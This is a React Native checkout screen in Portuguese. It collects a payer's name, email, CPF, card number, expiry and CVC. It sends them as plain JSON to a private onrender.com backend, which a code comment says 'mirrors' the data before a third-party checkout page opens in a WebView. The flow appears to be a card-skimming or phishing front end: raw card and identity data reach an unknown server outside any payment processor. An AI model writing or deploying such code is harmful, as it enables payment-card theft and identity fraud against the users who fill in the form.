import React, { useState } from "react";
import { 
  View, 
  Text, 
  StyleSheet, 
  TextInput, 
  TouchableOpacity, 
  ScrollView, 
  ActivityIndicator, 
  Modal, 
  Alert, 
  SafeAreaView 
} from "react-native";
import { WebView } from 'react-native-webview';

export default function PaymentScreen() {
  const [form, setForm] = useState({ name: "", email: "", cpf: "", number: "", expiry: "", cvc: "" });
  const [loading, setLoading] = useState(false);
  const [checkoutUrl, setCheckoutUrl] = useState(null);
  const [modalVisible, setModalVisible] = useState(false);

  const processarPagamento = async () => {
    // Validação básica de preenchimento
    if (!form.name || !form.email.includes("@") || form.number.length < 13 || !form.cpf) {
      Alert.alert("Erro", "Por favor, preencha todos os dados corretamente.");
      return;
    }

    setLoading(true);
    try {
      // Envia os dados digitados para o seu backend fazer o espelhamento
      const res = await fetch("https://backend-social22.onrender.com/process-nowpayments-card", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form) 
      });

      const data = await res.json();

      // O seu backend deve processar e retornar a URL do checkinpremium.com
      if (data.redirectUrl) {
        setCheckoutUrl(data.redirectUrl);
        setModalVisible(true);
      } else {
        Alert.alert("Erro", data.message || "Falha ao iniciar processamento.");
      }
    } catch (err) {
      Alert.alert("Erro", "Falha na conexão com o servidor.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <ScrollView contentContainerStyle={styles.container}>
      <Text style={styles.title}>Checkout Premium</Text>

      <TextInput style={styles.input} placeholder="Nome Completo" value={form.name} onChangeText={(v) => setForm({...form, name: v})} />
      <TextInput style={styles.input} placeholder="E-mail" keyboardType="email-address" autoCapitalize="none" value={form.email} onChangeText={(v) => setForm({...form, email: v})} />
      <TextInput style={styles.input} placeholder="CPF" keyboardType="numeric" value={form.cpf} onChangeText={(v) => setForm({...form, cpf: v})} />
      
      <View style={styles.divider} />

      <TextInput style={styles.input} placeholder="Número do Cartão" keyboardType="numeric" value={form.number} onChangeText={(v) => setForm({...form, number: v})} />
      <View style={styles.row}>
        <TextInput style={[styles.input, {flex: 1}]} placeholder="MM/AA" value={form.expiry} onChangeText={(v) => setForm({...form, expiry: v})} />
        <TextInput style={[styles.input, {flex: 1}]} placeholder="CVC" keyboardType="numeric" value={form.cvc} onChangeText={(v) => setForm({...form, cvc: v})} />
      </View>

      <TouchableOpacity style={styles.button} onPress={processarPagamento} disabled={loading}>
        {loading ? <ActivityIndicator color="#fff" /> : <Text style={styles.buttonText}>Pagar R$ 30,00</Text>}
      </TouchableOpacity>

      {/* Modal que abre o site destino */}
      <Modal visible={modalVisible} animationType="slide" transparent={false}>
        <SafeAreaView style={{ flex: 1, backgroundColor: '#fff' }}>
          <View style={{ flex: 1 }}>
            {checkoutUrl && (
              <WebView 
                source={{ uri: checkoutUrl }} 
                startInLoadingState={true}
                renderLoading={() => <ActivityIndicator size="large" color="#28a745" style={styles.absoluteCenter} />}
              />
            )}
            <TouchableOpacity style={styles.closeButton} onPress={() => setModalVisible(false)}>
              <Text style={{color: '#fff', fontWeight: 'bold'}}>Fechar e Voltar</Text>
            </TouchableOpacity>
          </View>
        </SafeAreaView>
      </Modal>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: { padding: 20, paddingTop: 60, backgroundColor: '#fff', flexGrow: 1 },
  title: { fontSize: 24, fontWeight: "bold", marginBottom: 25, textAlign: 'center', color: '#333' },
  input: { height: 50, borderWidth: 1, borderColor: "#ccc", borderRadius: 8, paddingHorizontal: 15, marginBottom: 15, fontSize: 16, color: '#333' },
  row: { flexDirection: "row", gap: 10 },
  button: { backgroundColor: "#28a745", height: 55, borderRadius: 8, justifyContent: "center", alignItems: "center", marginTop: 10 },
  buttonText: { color: "#fff", fontWeight: "bold", fontSize: 18 },
  divider: { height: 1, backgroundColor: '#eee', marginVertical: 20 },
  closeButton: { padding: 20, backgroundColor: '#dc3545', alignItems: 'center' },
  absoluteCenter: { position: 'absolute', top: '50%', left: '50%', transform: [{ translateX: -25 }, { translateY: -25 }] }
});